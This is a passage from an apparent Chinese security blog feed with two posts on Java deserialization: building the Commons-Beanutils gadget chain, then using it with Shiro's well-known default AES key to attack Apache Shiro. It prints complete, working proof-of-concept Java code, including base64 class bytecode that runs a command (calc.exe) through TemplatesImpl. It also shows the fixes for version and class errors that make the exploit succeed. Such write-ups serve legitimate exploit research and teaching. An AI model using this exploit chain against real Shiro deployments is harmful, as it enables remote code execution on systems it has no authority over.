class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="The-first-报错"><a href="#The-first-报错" class="headerlink" title="The first 报错"></a>The first 报错</h2><p>我们用这段POC生成<code>payload</code>去攻击<code>shiro</code>，会发现并没有弹出计算器，而且回去看<code>Tomcat</code>还有报错，信息如下：</p><p><img src="https://s2.loli.net/2022/03/10/gR5pt743yNFUvbS.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc</span><br><span class="line">serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</span><br></pre></td></tr></table></figure><p>意思就是给你说两个<code>serialVersionUID</code>不一样，那<code>serialVersionUID</code>是什么呢？</p><p>其实出现这个原因，就是因为库的版本不同，因为如果两个不同的版本使用了同一个类，由于版本不同，可能有一些方法和属性会发生一些变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方 的环境中这个类计算出的<code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患</p><p>而我们本地用的<code>commons-beanutils</code>是1.9.2版本，而<code>Shiro</code>中自带的<code>commons-beanutils</code>是1.8.3版本，版本不同自然就要出问题</p><p>所以说解决方法也很简单，把两个版本调成一样的就行，我们肯定不能去动<code>shiro</code>中的版本，那就把本地的版本调成1.8.3的版本就行了，调完之后记得用<code>maven</code>重新加载哈，看看外部库里版本对了就行</p><h2 id="The-second-报错"><a href="#The-second-报错" class="headerlink" title="The second 报错"></a>The second 报错</h2><p>这时候我们生成<code>payload</code>去打，发现还是不行，还是有报错，报错如下：</p><p><img src="https://s2.loli.net/2022/03/10/iGJPS1F8RhBCYwE.png" alt="image.png"></p><p>这个报错意思就是说没有找到<code>org.apache.commons.collections.comparators.ComparableComparator</code>类，从包名就可以看出这个类来自<code>commons-collections</code>；<code>commons-beanutils</code>本来应该是依赖于<code>commons-collections</code>的，照理说这个类应该能用；但问题就是，在<code>Shiro</code>中，它的<code>commons-beanutils</code>虽然包含了一部分<code>commons-collections</code>的类，但却不全。这也导致，正常使用<code>Shiro</code>的时候不需要依赖于<code>commons-collections</code>，但反序列化利用的时候需要依赖于<code>commons-collections</code>，也就是说我们用到了它没有的类，就离谱</p><p>那怎么办呢，我们就得想办法绕开这个类了，先看看它在哪里用到了<code>ComparableComparator</code>类</p><p><img src="https://s2.loli.net/2022/03/10/bmSKPtrIZjGeEMN.png" alt="image.png"></p><p>找到了，在这儿，也就是构造<code>BeanComparator</code>对象的时候，有些同学可能会有疑问，我们不是无参构造的<code>BeanComparator</code>对象吗，为啥会进这个呢？因为无参构造方法里面写的<code>this((String)null)</code>，那么相当于就会调用下面那个带参构造方法只不过<code>property</code>为空，调试一下就知道了，当没有显式传入<code>Comparator</code>的情况下，则默认使用<code>ComparableComparator</code></p><p>没有这个<code>ComparableComparator</code>我们就来找个别的类代替它，这个类条件如下：</p><ol><li>实现<code>java.util.Comparator</code>接口 </li><li>实现<code>java.io.Serializable</code>接口</li><li>Java、shiro或<code>commons-beanutils</code>自带，且兼容性强</li></ol><p>我们找到了一个类，它就是<code>CaseInsensitiveComparator</code>，这个<code>CaseInsensitiveComparator</code>类是<code>java.lang.String</code>类下的一个内部私有类，其实现了<code>Comparator</code>和<code>Serializable</code>，且位于Java的核心代码中，兼容性强，符合所有条件</p><p>我们通过<code>String.CASE_INSENSITIVE_ORDER</code>，即可拿到上下文中的<code>CaseInsensitiveComparator</code>对象，用它来代替<code>ComparableComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br></pre></td></tr></table></figure><h2 id="The-third-报错"><a href="#The-third-报错" class="headerlink" title="The third 报错"></a>The third 报错</h2><p>这个报错就更离谱了，我直接连payload都生成不了哈哈哈，不过这个问题好解决：</p><p><img src="https://s2.loli.net/2022/03/10/fxQSwNb2EyDsRmn.png" alt="image.png"></p><p>应该是类型的问题，我们后面添加的是两个整形对象，不能转换成字符串类型，那我们把<code>1</code>改成<code>&quot;1&quot;</code>就解决了</p><h2 id="FINAL"><a href="#FINAL" class="headerlink" title="FINAL"></a>FINAL</h2><p>所以说最终的POC为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cb_shiro</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="keyword">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        AesCipherService aes = <span class="keyword">new</span> AesCipherService();</span><br><span class="line">        <span class="keyword">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        ByteSource finalpayload = aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/10/Pna89VWYfNBQoGL.png" alt="image.png"></p><p>成功咯</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;利用CB链攻击shiro&quot;&gt;&lt;a href=&quot;#利用CB链攻击shiro&quot; class=&quot;headerlink&quot; title=&quot;利用CB链攻击shiro&quot;&gt;&lt;/a&gt;利用CB链攻击shiro&lt;/h1&gt;&lt;p&gt;上一篇文章我们讲到了CB链，通过CB链弹出了计算器，那我们自然就会想到能不能利用CB链经过加密之后去攻击&lt;code&gt;shiro&lt;/code&gt;呢？肯定是可以的，而且还挺简单的，和上篇文章基本类似，就是说有几个注意事项&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之Commons Beanutils</title>
    <link href="https://arsenetang.github.io/2022/03/09/Java%E7%AF%87%E4%B9%8BCommons%20Beanutils/"/>
    <id>https://arsenetang.github.io/2022/03/09/Java%E7%AF%87%E4%B9%8BCommons%20Beanutils/</id>
    <published>2022-03-08T16:00:00.000Z</published>
    <updated>2022-03-09T10:48:33.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons Beanutils"></a>Commons Beanutils</h1><p>前面我们讲完了cc链，接下来我们就开始cb链了，也就是<code>Commons Beanutils</code>，还好它只有一条链子，也要用到我们前面介绍过的<code>java.util.PriorityQueue</code>类</p><span id="more"></span><p>上一篇文章中我们已经介绍了<code>PriorityQueue</code>这个类了，它是一个优先队列，在反序列化这个对象之后，为了保证队列的顺序，它会进行重新排序，在重新排序的过程中会调用<code>Comparator.compare() </code>方法进行大小比较</p><h2 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h2><p>在进入正题之前，我们先来看看<code>Java</code>中的<code>JavaBean</code>类是什么；<code>JavaBean</code>是一种符合命名规范的<code>class</code>，它需要符合下列要求：</p><ol><li>若干个属性都是<code>private</code>类型</li><li>并且这些属性都有<code>public</code>类型的<code>get</code>和<code>set</code>方法</li><li>并且命名要符合规范，符合骆驼式命名法，比如说属性名为<code>abc</code>，那么<code>get</code>方法为<code>public Type getAbc()</code>，<code>set</code>方法为<code>public void setAbc(Type value)</code></li></ol><p>那么这种<code>class</code>就被称为<code>JavaBean</code>，其实也就是规范写法的类，比如说举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">People</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">&quot;Arsene.Tang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age = <span class="number">18</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是一个很简单的<code>JavaBean</code></p><p>而在<code>commons-beanutils</code>中就提供了一种静态方法，可以让使用者直接调用到任意<code>JavaBean</code>对象中的<code>getter</code>方法，这个方法属实就很危险，它就是<code>PropertyUtils.getProperty</code>，用法也很简单，只有两个参数，前面是<code>JavaBean</code>对象，后面是想要获取的方法名，比如说：<code>PropertyUtils.getProperty(people,&quot;name&quot;)</code>，看看完整的代码：</p><p><img src="https://s2.loli.net/2022/03/09/1tMCwm3zWF7XxfD.png" alt="image.png"></p><p>这样就成功调用到了<code>people</code>对象的<code>getName()</code>和<code>getAge()</code>方法</p><p>并且<code>PropertyUtils.getProperty </code>还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取，这样就可以很方便的调用任意对象的<code>getter</code>方法，适用于在不确定<code>JavaBean</code>是哪个类对象时使用</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>我们在Java动态加载字节码中讲到了用<code>TemplatesImpl</code>类动态加载，一层一层的往上，推到了调用<code>newTransformer()</code>方法，然后慢慢往下调最终调用<code>defineClass()</code>加载字节码；其实在<code>newTransformer()</code>方法之前，还有一个方法可以调用到<code>newTransformer()</code>方法，而且它也是<code>public</code>类型，它就是<code>getOutputProperties()</code>方法，看看源码吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>它也是一个<code>getter</code>方法，那我们自然就有一个思路了，我们能不能通过<code>PropertyUtils.getProperty</code>方法调用这个<code>getter</code>方法，最后成功加载字节码呢？只要能加载字节码我们就能执行任意命令了</p><p>首先，我们得先找到一个<code>java.util.Comparator</code>对象，在它的<code>compare()</code>方法中调用<code>PropertyUtils.getProperty</code>方法加载字节码，因为上篇文章中我们讲到了反序列化<code>PriorityQueue</code>对象之后，通过一系列的调用，最终调用到<code>comparator.compare()</code></p><p>而这个对象就是<code>org.apache.commons.beanutils.BeanComparator</code>，存在于<code>commons-beanutils</code>包中，我们看看它的<code>compare</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">( <span class="keyword">final</span> T o1, <span class="keyword">final</span> T o2 )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="keyword">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> internalCompare( o1, o2 );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> Object value1 = PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="keyword">final</span> Object value2 = PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> internalCompare( value1, value2 );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( <span class="keyword">final</span> NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很完美，里面正好就有<code>PropertyUtils.getProperty</code>，其实<code>BeanComparator</code>类是<code>commons-beanutils</code>用来比较两个<code>JavaBean</code>是否相等的类，它实现了<code>java.util.Comparator</code>接口，自然就会有<code>compare</code>方法；这个方法传入两个对象，如果<code>this.property</code>为空，则直接比较这两个对象；如果<code>this.property</code>不为空，则用<code>PropertyUtils.getProperty</code>分别取这两个对象的<code>this.property</code>属性，比较属性的值，不管怎么说，它就可以调用<code>getter</code>方法了，那么只要在<code>o1</code>这个位置上放我们构造好的<code>TemplatesImpl</code>对象，在<code>property</code>这个位置上放<code>OutputProperties</code>，那不就成功调用<code>TemplatesImpl#getOutputProperties()</code>方法了？</p><p>其实这里跟上一篇文章结合的是非常紧密的，如果你感觉有点昏建议回去复习复习哦</p><h2 id="构造利用链"><a href="#构造利用链" class="headerlink" title="构造利用链"></a>构造利用链</h2><p>最开始还是创建<code>TemplateImpl</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>然后实例化<code>BeanComparator</code>，这里先不设置<code>property</code>，防止报错，后面再用反射来操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br></pre></td></tr></table></figure><p>然后就是创建我们前面讲过的优先队列<code>PriorityQueue</code>，把这个<code>comparator</code>放进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Queue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>同样，还是先添加两个无害的对象1进去，防止出问题，因为我们刚开始时并没有设置<code>property</code>，当<code> this.property</code>为空时，相当于就是直接比较这两个对象，对这两个1进行排序，然后最后才把我们恶意的<code>outputProperties</code>和<code>TemplateImpl</code>设置进去，其实<code>queue</code>里面的第二个元素也不一定要是<code>obj</code>，随便一个对象都行，有一个<code>TemplateImpl</code>对象就够了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>所以说最后完整POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutils1_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        